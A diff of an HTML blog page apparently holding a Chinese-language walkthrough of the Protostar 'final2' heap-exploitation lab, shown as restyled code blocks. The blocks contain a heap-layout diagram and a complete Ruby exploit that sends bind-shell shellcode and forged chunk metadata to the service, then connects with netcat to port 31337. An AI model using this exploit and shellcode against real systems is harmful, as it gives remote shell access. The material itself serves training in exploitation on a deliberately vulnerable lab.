+</span></span><span style="display:flex;"><span>0x0000000000000002:  <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">08</span>    add al, <span style="color:#ae81ff">8</span>
 </span></span></code></pre></div><p>看起来还算正常，并不会导致 Illegal instruction</p>
 </blockquote>
 <hr>
@@ -653,26 +660,26 @@ The memmove() function copies <code>n</code> bytes from memory area <code>src</c
 <li>start 指向 prev_size 之前</li>
 </ol>
 <p>也就是：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># zzzz is padding</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># prsz = chunkB.prev_size</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># size = chunkB.size</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">← chunk A<span class="p">|</span>chunk B →                            -8<span class="p">|</span>  -4<span class="p">|</span>  fd<span class="p">|</span>  bk    
-</span></span><span class="line"><span class="cl">....<span class="p">|</span>zzz/<span class="p">|</span>prsz<span class="p">|</span>size<span class="p">|</span>FSRD<span class="p">|</span>zzzz<span class="p">|</span>....<span class="p">|</span>ROOT<span class="p">|</span>zzz/<span class="p">|</span><span class="o">====</span><span class="p">|</span><span class="o">====</span><span class="p">|</span><span class="o">====</span><span class="p">|</span><span class="o">====</span>
-</span></span><span class="line"><span class="cl">        ↑                          ↑       ↑p <span class="o">=</span> rindex<span class="o">(</span>buf, <span class="s1">&#39;/&#39;</span><span class="o">)</span>
-</span></span><span class="line"><span class="cl">        ↑                          ↑       ↑l <span class="o">=</span> strlen<span class="o">(</span>p<span class="o">)</span> <span class="o">=</span> <span class="m">9</span>
-</span></span><span class="line"><span class="cl">        ↑                          ↑start <span class="o">=</span> <span class="o">(</span>buf, <span class="s2">&#34;ROOT&#34;</span><span class="o">)</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">        ↑while<span class="o">(</span>*start !<span class="o">=</span> <span class="s1">&#39;/&#39;</span><span class="o">)</span> <span class="o">{</span>start--<span class="p">;</span><span class="o">}</span>
-</span></span><span class="line"><span class="cl">        ↑start              
-</span></span><span class="line"><span class="cl">                               
-</span></span><span class="line"><span class="cl">                           ↓   
-</span></span><span class="line"><span class="cl">                  memmove<span class="o">(</span>start, p, l<span class="o">)</span>
-</span></span><span class="line"><span class="cl">                           ↓  
-</span></span><span class="line"><span class="cl">                    
-</span></span><span class="line"><span class="cl">← chunk A<span class="p">|</span>chunk B →
-</span></span><span class="line"><span class="cl">....<span class="p">|</span>zzz/<span class="p">|</span>prsz<span class="p">|</span>size<span class="p">|</span>FSRD<span class="p">|</span>zzzz<span class="p">|</span>....<span class="p">|</span>ROOT<span class="p">|</span>zzz/<span class="p">|</span>fff8<span class="p">|</span>fffc
-</span></span><span class="line"><span class="cl">        /<span class="p">|</span><span class="o">====</span><span class="p">|</span><span class="o">====</span><span class="p">|</span><span class="o">====</span><span class="p">|</span><span class="o">====</span>                               
-</span></span><span class="line"><span class="cl">            -8<span class="p">|</span>  -4<span class="p">|</span>  fd<span class="p">|</span>  bk
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># zzzz is padding</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># prsz = chunkB.prev_size</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># size = chunkB.size</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>← chunk A|chunk B →                            -8|  -4|  fd|  bk    
+</span></span><span style="display:flex;"><span>....|zzz/|prsz|size|FSRD|zzzz|....|ROOT|zzz/|<span style="color:#f92672">====</span>|<span style="color:#f92672">====</span>|<span style="color:#f92672">====</span>|<span style="color:#f92672">====</span>
+</span></span><span style="display:flex;"><span>        ↑                          ↑       ↑p <span style="color:#f92672">=</span> rindex<span style="color:#f92672">(</span>buf, <span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        ↑                          ↑       ↑l <span style="color:#f92672">=</span> strlen<span style="color:#f92672">(</span>p<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>
+</span></span><span style="display:flex;"><span>        ↑                          ↑start <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>buf, <span style="color:#e6db74">&#34;ROOT&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        ↑while<span style="color:#f92672">(</span>*start !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>start--;<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>        ↑start              
+</span></span><span style="display:flex;"><span>                               
+</span></span><span style="display:flex;"><span>                           ↓   
+</span></span><span style="display:flex;"><span>                  memmove<span style="color:#f92672">(</span>start, p, l<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                           ↓  
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>← chunk A|chunk B →
+</span></span><span style="display:flex;"><span>....|zzz/|prsz|size|FSRD|zzzz|....|ROOT|zzz/|fff8|fffc
+</span></span><span style="display:flex;"><span>        /|<span style="color:#f92672">====</span>|<span style="color:#f92672">====</span>|<span style="color:#f92672">====</span>|<span style="color:#f92672">====</span>                               
+</span></span><span style="display:flex;"><span>            -8|  -4|  fd|  bk
 </span></span></code></pre></div><h2 id="implement">Implement</h2>
 <p>最终的思路画成图：</p>
 <p><img src="/p/protostar_final_2/buf.png"
@@ -690,42 +697,42 @@ The memmove() function copies <code>n</code> bytes from memory area <code>src</c
 	
 ></p>
 <p>直接写成脚本吧</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/ruby</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;&gt; Enter hostname:&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">hostname</span> <span class="o">=</span> <span class="nb">gets</span><span class="o">.</span><span class="n">chomp</span>
-</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">2993</span>
-</span></span><span class="line"><span class="cl"><span class="n">socket</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># tcpbindshell  (108 bytes)</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># http://shell-storm.org/shellcode/files/shellcode-847.php</span>
-</span></span><span class="line"><span class="cl"><span class="no">PORTHL</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x7a\x69</span><span class="s2">&#34;</span> <span class="c1"># default is \x7a\x69 = 31337</span>
-</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="no">PORTHL</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 0xfffffff8 = -8</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 0xfffffffc = -4</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 0x0804d41c = write_address</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># 0x0804e014 = shellcode_address</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">#chunkMetadata = [0xfffffff8].pack(&#34;I&#34;) + [0xfffffffc].pack(&#34;I&#34;) + [0x0804d41c-0xc].pack(&#34;I&#34;) + [0x0804e014].pack(&#34;I&#34;)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">chunkMetadata</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\xf8\xff\xff\xff</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\xfc\xff\xff\xff</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\x10\xd4\x04\x08</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\x08\xe0\x04\x08</span><span class="s2">&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">chunkA</span> <span class="o">=</span> <span class="s2">&#34;FSRD&#34;</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">128</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">bytesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">chunkB</span> <span class="o">=</span> <span class="s2">&#34;FSRD&#34;</span> <span class="o">+</span> <span class="s2">&#34;z&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">128</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">-</span> <span class="n">chunkMetadata</span><span class="o">.</span><span class="n">bytesize</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;ROOTzzz/&#34;</span> <span class="o">+</span> <span class="n">chunkMetadata</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="n">chunkA</span><span class="o">.</span><span class="n">inspect</span>
-</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="n">chunkB</span><span class="o">.</span><span class="n">inspect</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">socket</span><span class="o">.</span><span class="n">puts</span> <span class="n">chunkA</span> <span class="o">+</span> <span class="n">chunkB</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">system</span><span class="p">(</span><span class="s2">&#34;nc -v 192.168.215.129 31337&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">socket</span><span class="o">.</span><span class="n">close</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ruby" data-lang="ruby"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/ruby</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>require <span style="color:#e6db74">&#39;socket&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts <span style="color:#e6db74">&#34;&gt; Enter hostname:&#34;</span>
+</span></span><span style="display:flex;"><span>hostname <span style="color:#f92672">=</span> gets<span style="color:#f92672">.</span>chomp
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">2993</span>
+</span></span><span style="display:flex;"><span>socket <span style="color:#f92672">=</span> <span style="color:#66d9ef">TCPSocket</span><span style="color:#f92672">.</span>open(hostname, port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># tcpbindshell  (108 bytes)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># http://shell-storm.org/shellcode/files/shellcode-847.php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">PORTHL</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7a\x69</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># default is \x7a\x69 = 31337</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">PORTHL</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0xfffffff8 = -8</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0xfffffffc = -4</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x0804d41c = write_address</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 0x0804e014 = shellcode_address</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#chunkMetadata = [0xfffffff8].pack(&#34;I&#34;) + [0xfffffffc].pack(&#34;I&#34;) + [0x0804d41c-0xc].pack(&#34;I&#34;) + [0x0804e014].pack(&#34;I&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunkMetadata <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf8\xff\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\xff\xff\xff</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x10\xd4\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x08\xe0\x04\x08</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunkA <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FSRD&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> shellcode <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">128</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> shellcode<span style="color:#f92672">.</span>bytesize <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chunkB <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;FSRD&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;z&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">128</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> chunkMetadata<span style="color:#f92672">.</span>bytesize) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;ROOTzzz/&#34;</span> <span style="color:#f92672">+</span> chunkMetadata
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>puts chunkA<span style="color:#f92672">.</span>inspect
+</span></span><span style="display:flex;"><span>puts chunkB<span style="color:#f92672">.</span>inspect
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>socket<span style="color:#f92672">.</span>puts chunkA <span style="color:#f92672">+</span> chunkB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system(<span style="color:#e6db74">&#34;nc -v 192.168.215.129 31337&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>socket<span style="color:#f92672">.</span>close
 </span></span></code></pre></div><p><img src="/p/protostar_final_2/host.png"
 	width="2880"
 	height="1298"
@@ -756,17 +763,10 @@ The memmove() function copies <code>n</code> bytes from memory area <code>src</c
 ></p>
 <h2 id="appendix">Appendix</h2>
 <p><em><strong>buf.png (using draw.io)</strong></em></p>
-<!--[if IE]><meta http-equiv="X-UA-Compatible" content="IE=5,IE=9" ><![endif]-->
-<!DOCTYPE html>
-<html>
-<head>
-<title>final2</title>
-<meta charset="utf-8"/>
-</head>
-<body><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-04-24T11:05:37.446Z\&quot; agent=\&quot;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15\&quot; etag=\&quot;ApChp6LcjIeV3BTGLDGZ\&quot; version=\&quot;17.4.6\&quot;&gt;&lt;diagram id=\&quot;NCleSQAFDJfZPQC8IUO4\&quot; name=\&quot;Page-3\&quot;&gt;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&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}"></div>
-<script type="text/javascript" src="https://viewer.diagrams.net/js/viewer-static.min.js"></script>
-</body>
-</html>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+
 </section>
  <footer class="article-footer">
     
@@ -1128,7 +1128,7 @@ The memmove() function copies <code>n</code> bytes from memory area <code>src</c
         
         <div class="widget--toc">
             <nav id="TableOfContents">
-  <ol>
+  <ul>
     <li><a href="#final-two">Final Two</a></li>
     <li><a href="#vulnerability">Vulnerability</a></li>
     <li><a href="#restriction">Restriction</a></li>
@@ -1136,7 +1136,7 @@ The memmove() function copies <code>n</code> bytes from memory area <code>src</c
     <li><a href="#expection">Expection</a></li>
     <li><a href="#implement">Implement</a></li>
     <li><a href="#appendix">Appendix</a></li>
-  </ol>
+  </ul>
 </nav>
         </div>
     </section>
